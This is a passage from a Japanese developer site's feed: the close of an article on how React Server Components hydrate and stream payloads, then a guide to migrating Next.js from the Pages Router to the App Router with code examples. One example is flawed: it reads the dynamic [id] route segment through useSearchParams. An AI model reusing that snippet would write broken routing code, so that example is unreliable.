<p>そのため、アプリのインタラクティブ機能が増えるにつれ、Server　ComponentsをClient ComponentとServer Componentのコンポジションに組み替えるようになります。</p>
<p><code class="language-text">useReducer</code>や<code class="language-text">useState</code>などが必要な場合は、Client Componentが必要になります。</p>
<p>コンポーネントがどこで実行されるのかを念頭に置いておくと、フックを適切に使用する（または使用しない）ことができます。</p>
<h2>ハイドレートするか否か</h2>
<p>よく誤解される点について少しお話ししたいと思います。RSCはハイドレートするのか、という点についてです。</p>
<p>答えは否です。ハイドレーションとは、イベントをハンドラにフックできるよう仮想DOMを構築するために、実際の関数をクライアント上で再実行することです。</p>
<p>Reactでは、ボタンをクリックすると、そのイベントはDOMツリーの最上部にあるReactのルートまで送られ、どのコンポーネントがクリックを処理するかをReactが判断します（答えは、ボタンの作成に関わったコンポーネントです）。</p>
<p>したがって、Reactがイベントに適切に対応できるよう、仮想DOMと、クリックを処理するコードがなくてはいけません。
RSCは非インタラクティブです。少なくともReactの通常のアプローチでは、stateの設定も、クリックの処理も行いません。実行するためにコードをクライアントに送ることもないので、当然ながらハイドレートしません。</p>
<p>しかし、仮想DOMの構築には関わっています。ツリーの差分検出処理にも関わっています。ハイドレートしないからと言って、ハイドレーション時にツリー上に存在しないわけではありません。存在します。</p>
<h2>再フェッチと差分検出</h2>
<p>実際のアプリでは、ページの初回ローディングだけでなく、サーバーコンポーネントの再フェッチについても考える必要があるでしょう。</p>
<p>つまり、サーバーにコンポーネント（場合によっては新しいpropsを含む）を再実行するよう指示し、仮想DOMを更新するために新しいPayloadデータを送ってもらうということです。</p>
<p>例えば、RSCが生成したデータリストにページ番号を付けていく場合、ルートが<code class="language-text">/page/1</code>か<code class="language-text">/page/2</code>であるかによって、異なるデータセットを取得することが望まれます。</p>
<p>これはRSCの利点であり、おそらくメタフレームワークのルーターに組み込まれています。UIはサーバー上で計算されますが、メタフレームワークはページ全体を再度読み込む必要がありません。</p>
<p>RSCはその性質上、仮想DOMの定義をクライアントにストリーミングすることができ、Reactは通常どおりクライアント側で差分検出処理を行うことができます。つまり、ページを再度読み込む必要がなく、ページ上の他のstateも失われません。</p>
<p>この点において、RSCはサーバーレンダリングとクライアントレンダリングの両方の長所を提供できます。サーバー上で実行しながら、クライアント上で実行された場合と同じように更新することができます
。
RSCの仕組みについて説明しましたので、より直感的にご理解いただけるのではないかと思います。Reactはすでに仮想DOMの差分計算によってDOMを更新していますので、仮想DOMのデータをサーバーから取得できれば、Reactは通常の動作を行うことが可能です。</p>
<h2>バンドルサイズに関する誤解</h2>
<p>10年以上前から、使用するツールの仕組みを深く理解することの重要性を説いてきました。<a href="https://tonyalicea.dev/courses">筆者のコース</a>では、一貫してこのテーマについて扱ってきました。</p>
<p>多くの生徒がこのアプローチの重要性を理解してくれていますが、「理論が多すぎる。実践から学べばいい」と不満を漏らす生徒もたまにいます。</p>
<p>しかし、使用するツールやライブラリ、フレームワークの仕組みを理解することの主な価値の一つが、正確な情報に基づき、アーキテクチャに関する効果的な判断ができることです。</p>
<p>例えば、Next.jsの世界ではRSCのメリットについて以前から誤解がありました。<code class="language-text">__next_f()</code>関数について、Next.jsコードのリポジトリでは<a href="https://github.com/vercel/next.js/discussions/42170">素晴らしい議論</a>が繰り広げられています。</p>
<p>RSCを使い始めたデベロッパーは、ページ下部の<code class="language-text">script</code>タグでこの関数に重複データが渡されていることに気づきました。なぜそこにこの関数があるのか疑問に感じ、無効にできないか尋ねるデベロッパーもいました。</p>
<p>この重複データは何でしょうか。そう、Payloadです。ストリーミングされてきた関数コールは、仮想DOMを作成するため、最終的にそのPayloadデータをReactに渡します。仕組みを理解していなければ、これはかなりショッキングなことでしょう。</p>
<p>問題は帯域幅の使用量が増えることであり、多くのデベロッパーがその点について不満を述べていました。ネットワークを介して送るデータ量が増えているのです。</p>
<p>なぜデベロッパー達は驚いたのでしょうか。当初、VercelはNext.jsのドキュメンテーションサイトでRSCについて次のように説明していました。</p>
<p><img src="https://tonyalicea.dev/assets/blogimages/vercel_orig.jpeg"></p>
<p><em>バンドルサイズ：Server Componentsでは、以前ならクライアントJavaScriptのバンドルサイズに影響するような大きな依存関係をサーバー上に残すことができます。クライアントはServer ComponentsのJavaScriptをダウンロードして解析し、実行する必要が一切ないため、これはインターネットの通信速度が遅い、あるいはデバイスの処理能力が低いユーザーにとって有益です。</em></p>
<p>「クライアントはServer ComponentsのJavaScriptをダウンロードして解析し、実行する必要が一切ない」という文言が誤解を招いたようです。これは実際には正しくありません。VercelはServer Componentsの実際のJavaScriptコードについて言っていたのですが、「一切」という言葉を使ってしまいました。</p>
<p>筆者はこれに関連し、VercelとSNS上で<a href="https://x.com/joshcstory/status/1766547542194409664">興味深い会話</a>をしました。この会話が、後日文言が変更されるきっかけになったのかもしれません（文言を変更したVercelに感謝）。</p>
<p><img src="https://tonyalicea.dev/assets/blogimages/vercel_updated.jpeg"></p>
<p><em>パフォーマンス：Server Componentsは、パフォーマンスをベースラインから最適化する手段を提供します。例えば、Client Componentだけで構成されるアプリから始めた場合、UIの非インタラクティブ要素をServer Componentsに移動することで、クライアント側が必要なJavaScriptの量を減らすことができます。ブラウザがダウンロードして解析し、実行するクライアント側JavaScriptの量が減るため、これはインターネットの通信速度が遅い、あるいはデバイスの処理能力が低いユーザーにとって有益です。</em></p>
<p>新しい説明には、Server Componentsが「クライアント側が必要なJavaScriptの量を減らすことができる」と書いてあります。それは事実です。しかし、Payloadはある意味JavaScript、少なくとも、JavaScriptの関数に渡されるデータなので、JavaScriptの量を増やすこともあります。</p>
<p>デベロッパーたちが誤解していた重要な点は、<strong>バンドルサイズと帯域幅の使用量は同じではないということです</strong>。</p>
<p>Server Componentのコードはバンドルに含まれていないので、バンドルサイズは小さくなります。しかし、Payloadのデータは倍増しますので、データが大きいと（この記事のような長編のブログ記事など）節約できるバイト数以上のデータを送信することになります。</p>
<h2>RSCはいつ使うべきか</h2>
<p>では、RSCはいつ使うべきなのでしょうか。大抵の場合そうであるように、「状況次第」というのが正しい答えです。RSCの仕組みに関する正確なメンタルモデルが構築できていれば、適切なアーキテクチャを選択できるはずです。</p>
<p>筆者の場合、このような長編のブログ記事にはRSCを使用しません。帯域幅の使用量が多くなり、理にかなわないからです。コンテンツの多いサイトやアプリには、<a href="https://astro.build/">Astro</a>などを使用します。</p>
<p>一方、データベースへのアクセスが多く、ロジックが複雑な場合、Server Componentを使ってサーバーに処理させるかもしれません。大容量のJavaScriptライブラリを使用して比較的少量のコンテンツを作成する必要がある場合も同様です。バンドルとPayloadのトレードオフが価値に見合うようなら、RSCは理にかなっていると思います。</p>
<p>高度にインタラクティブなアプリを開発していて、頻繁にバージョンアップを行って機能を追加しているような場合も、Client Componentsを中心に運用し、クライアントとサーバー両方を使用するようなリファクタリングは極力控えると思います。</p>
<p>明確な使い方を推奨するには不確定要素があまりにも多すぎます。この記事を通じて試みたように、読者が正確な情報をもとに判断できるよう、理解を深める手助けをするのが筆者にできる精一杯のことです。</p>
<h2>今後の展望</h2>
<p>React Server Componentsの未来はどのようなものになるでしょうか。それは必ずしも明らかではありません。ReactはAPIを作り、メタフレームワークがそれを利用しています。</p>
<p>筆者の考えでは、TanStack Startが採用した、完全なServer Componentsではなく、仮想DOMを返す関数を用いるアプローチが普及すると思います。しかし、用途によってはNext.jsのアプローチも有効だと思います。</p>
<p>セキュリティとパフォーマンスも徐々に改善して欲しいと思います。例えば、仮想DOMのある枝が全てServer Componentsの場合、差分検出処理やハイドレーションを最適化することでその枝をスキップするようにできると思います。</p>
<h2>もっと詳しく学びたい方へ</h2>
<p>この記事がReact Server Componentsの理解を深める一助になれば幸いです。Reactの全てについて、このようにゼロから詳しく学びたい方は、筆者の完全版「<a href="https://understandingreact.com/">Understanding React</a>（Reactを理解する）」コースにぜひご登録ください。</p>
<p>27個のモジュールと、16.5時間の動画コンテンツを通じてReactのソースコードを詳しく学び、デベロッパーにとって最も有益なツールである正確なメンタルモデルを構築することができます。</p>
<p>それではまた！</p>]]></content:encoded></item><item><title><![CDATA[Next.jsのPages RouterからApp Routerに移行する]]></title><description><![CDATA[Next.jsプロジェクトをアップグレードする Next.jsの従来のPages Routerから新しいApp Routerに移行しましょう。ここの移行により、アプリケーションのルーティング効率と柔…]]></description><link>https://postd.cc/migrate-from-nextjs-pages-to-app-router/</link><guid isPermaLink="false">https://postd.cc/migrate-from-nextjs-pages-to-app-router/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[Next.js]]></category><pubDate>Thu, 24 Apr 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<h2>Next.jsプロジェクトをアップグレードする</h2>
<p>Next.jsの従来のPages Routerから新しいApp Routerに移行しましょう。ここの移行により、アプリケーションのルーティング効率と柔軟性が向上します。App Routerは、ファイルシステムベースのルーティング機能が改善されたほか、React Server Componentsが導入されたことなどにより、開発体験を向上させます。</p>
<h3>依存関係をチェックする</h3>
<p>package.jsonファイルのバージョンが最新であることが重要です。依存関係をすべてチェックし、新しいApp Routerと互換性があることを確認しましょう。必要であればアップグレードしてください。この準備を行うことで、移行時に互換性の問題が発生するのを避けることができます。</p>
<p>依存関係は<code class="language-text">npm</code>を使用することで簡単にチェックできます。以下のコマンドを実行してください。</p>
<p><code class="language-text">$ npm outdated</code></p>
<h3><code class="language-text">/app</code>ディレクトリを作成する</h3>
<p>まずは、Next.jsプロジェクトのルートに新しい<code class="language-text">/app</code>ディレクトリを作成しましょう。App Routerのファイルやコンポーネントはすべてここに格納されます。</p>
<h3>PagesフォルダからAppフォルダにファイルを移動する</h3>
<p>サーバー上でレンダリングされるHTMLドキュメントは、<code class="language-text">/pages/_document.tsx</code>ファイルを使用してカスタマイズします。App Routerでは、<code class="language-text">/app/layout.tsx</code>ファイルがこの機能を担います。</p>
<ul>
<li>
<p><code class="language-text">/pages/_document.tsx</code>の内容を<code class="language-text">/app/layout.tsx</code>という新しいファイルにコピーします。</p>
</li>
<li>
<p><code class="language-text">next/document</code>のインポートを削除し、<code class="language-text">&lt;Html></code>、<code class="language-text">&lt;Head></code>、<code class="language-text">&lt;Main /></code>の各コンポーネントを対応するHTMLコンポーネント（<code class="language-text">&lt;html></code>、<code class="language-text">&lt;head></code>、<code class="language-text">{children}</code>）に置き換えます。</p>
</li>
<li>
<p><code class="language-text">&lt;NextScript /></code>コンポーネントを削除します。</p>
</li>
</ul>
<h3>ページをApp Routerに移行する</h3>
<p><code class="language-text">/pages</code>ディレクトリにある各ページについて、対応するフォルダ構造を<code class="language-text">/app</code>ディレクトリに作成する必要があります。</p>
<ul>
<li>
<p>ページのURLパスと一致するフォルダ構造を<code class="language-text">/app</code>に作成します。例えば、<code class="language-text">/pages/about.tsx</code>にページがある場合、<code class="language-text">/app/about/page.tsx</code>ファイルを作成します。</p>
</li>
<li>
<p><code class="language-text">page.tsx</code>ファイルに元のページコンポーネントの内容をコピーします。</p>
</li>
<li>
<p>ページコンポーネントがクライアントサイドの機能（Hooks、Browser APIなど）を使用する場合、ファイルの先頭に<code class="language-text">use client</code>ディレクティブを記述してラップする必要があります。</p>
</li>
</ul>
<h3>データフェッチをアップデートする</h3>
<p>App Routerでは、Next.jsの従来のデータフェッチ方法（<code class="language-text">getStaticProps</code>、<code class="language-text">getServerSideProps</code>、<code class="language-text">getStaticPaths</code>）は使用されません。その代わり、ページコンポーネント内で直接データをフェッチできます。</p>
<ul>
<li>
<p>ページコンポーネント内に<code class="language-text">getStaticProps</code>、<code class="language-text">getServerSideProps</code>、<code class="language-text">getStaticPaths</code>のいずれかの関数がある場合は削除します。</p>
</li>
<li>
<p>JavaScript/TypeScriptの標準の非同期関数を使用し、ページコンポーネント内で直接データをフェッチします。</p>
</li>
</ul>
<h3>例1：データフェッチ</h3>
<h4>移行前（Pages Router）</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token comment">// /pages/about.tsx</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> GetStaticProps <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'next'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> getStaticProps<span class="token operator">:</span> <span class="token function-variable function">GetStaticProps</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetchSomeData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">{</span>
    props<span class="token operator">:</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">AboutPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> data <span class="token punctuation">}</span><span class="token operator">:</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> <span class="token builtin">any</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">About Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>data<span class="token punctuation">.</span>message<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> AboutPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h4>移行後（App Router）</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> fetchSomeData <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@/lib/data'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">AboutPage</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetchSomeData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">About Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>data<span class="token punctuation">.</span>message<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> AboutPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>ルーティングのHooksを移行する</h2>
<p>App Routerでは、Pages Routerで使用されていたものに代わる新しいルーティングのHooksが導入されます。</p>
<ul>
<li>
<p><code class="language-text">next/router</code>から<code class="language-text">useRouter()</code>を使用する代わりに、<code class="language-text">next/navigation</code>から<code class="language-text">useRouter()</code>、<code class="language-text">usePathname()</code>、<code class="language-text">useSearchParams()</code>を使用します。</p>
</li>
<li>
<p>新しいHooksの<code class="language-text">useRouter()</code> は、<code class="language-text">pathname</code>と<code class="language-text">query</code>のプロパティを返しません。代わりに、<code class="language-text">usePathname()</code>と<code class="language-text">useSearchParams()</code>を使用します。</p>
</li>
</ul>
<h3>例2：ルーティングのHooksの移行</h3>
<h4>移行前（Pages Router）</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token comment">// /pages/users/[id].tsx</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'next/router'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">UserPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> query <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> userId <span class="token operator">=</span> query<span class="token punctuation">.</span>id <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">User Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">User ID: </span><span class="token punctuation">{</span>userId<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> UserPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h4>移行後（App Router）</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token comment">// /app/users/[id]/page.tsx</span>
<span class="token string">'use client'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> usePathname<span class="token punctuation">,</span> useSearchParams <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'next/navigation'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">UserPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> pathname <span class="token operator">=</span> <span class="token function">usePathname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> searchParams <span class="token operator">=</span> <span class="token function">useSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> userId <span class="token operator">=</span> searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">User Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">User ID: </span><span class="token punctuation">{</span>userId<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> UserPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>エラーハンドリングをアップデートする</h3>
<p>App Routerでは、Pages Routerとはエラーハンドリングのアプローチが異なります。</p>
<ul>
<li>
<p>グローバルエラーのハンドリングについては、<code class="language-text">pages/_error.js</code>ファイルを<code class="language-text">app/error.tsx</code>に置き換えます。</p>
</li>
<li>
<p>特定のルートに関連するエラーの処理のためにページフォルダ内に個別の<code class="language-text">error.tsx</code>ファイルを作成します。</p>
</li>
</ul>
<h3>例3：エラーハンドリングの移行</h3>
<h4>移行前（Pages Router）</h4>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// /pages/_error.js</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NextPageContext <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'next'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">ErrorPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> statusCode <span class="token punctuation">}</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">statusCode</span><span class="token operator">:</span> number <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">Error </span><span class="token punctuation">{</span>statusCode<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">An error occurred on the server</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

ErrorPage<span class="token punctuation">.</span><span class="token function-variable function">getInitialProps</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> res<span class="token punctuation">,</span> err <span class="token punctuation">}</span><span class="token operator">:</span> NextPageContext</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> statusCode <span class="token operator">=</span> res <span class="token operator">?</span> res<span class="token punctuation">.</span>statusCode <span class="token operator">:</span> err <span class="token operator">?</span> err<span class="token punctuation">.</span>statusCode <span class="token operator">:</span> <span class="token number">404</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">{</span> statusCode <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> ErrorPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h4>移行後（App Router）</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token comment">// /app/error.tsx </span>
<span class="token comment">// エラーコンポーネントはClient Componentである必要があります！</span>
<span class="token string">'use client'</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">ErrorPageProps</span> <span class="token punctuation">{</span>
  error<span class="token operator">:</span> Error <span class="token operator">&amp;</span> <span class="token punctuation">{</span> digest<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span> <span class="token punctuation">}</span>
  <span class="token function-variable function">reset</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token function-variable function">ErrorPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> error<span class="token punctuation">,</span> reset <span class="token punctuation">}</span><span class="token operator">:</span> ErrorPageProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">Error</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>error<span class="token punctuation">.</span>message<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>
          <span class="token comment">// セグメントの再レンダリングにより復旧を試みます。</span>
          <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
		Try again
	  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> ErrorPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>他の機能の移行</h3>
<p>アプリケーションによっては、APIルートやミドルウェア、カスタムdocument/appコンポーネントなど他の機能も移行する必要があるかもしれません。これらの機能をApp Routerに移行する方法については、Next.jsのドキュメントをご覧ください。</p>
<h3>テストと検証</h3>
<p>移行が完了したら、アプリケーションのテストを行い、すべての機能が正常に動作することを確認しましょう。Pages RouterとApp Routerで挙動に違いが見られないか注意してみてください。</p>
<p>App RouterとPages Routerは同じNext.jsアプリケーション上に共存できるため、段階的な移行が可能です。App Routerがまだ対応していない特定のレガシー機能を残す必要がある場合などには、そうするとよいでしょう。</p>
<p><img src="https://www.luckymedia.dev/_next/image?url=https%3A%2F%2Fcms.luckymedia.dev%2Fassets%2Fposts%2Fnext.js-15-release-date.png&#x26;w=3840&#x26;q=75"></p>
<h2>まとめ</h2>
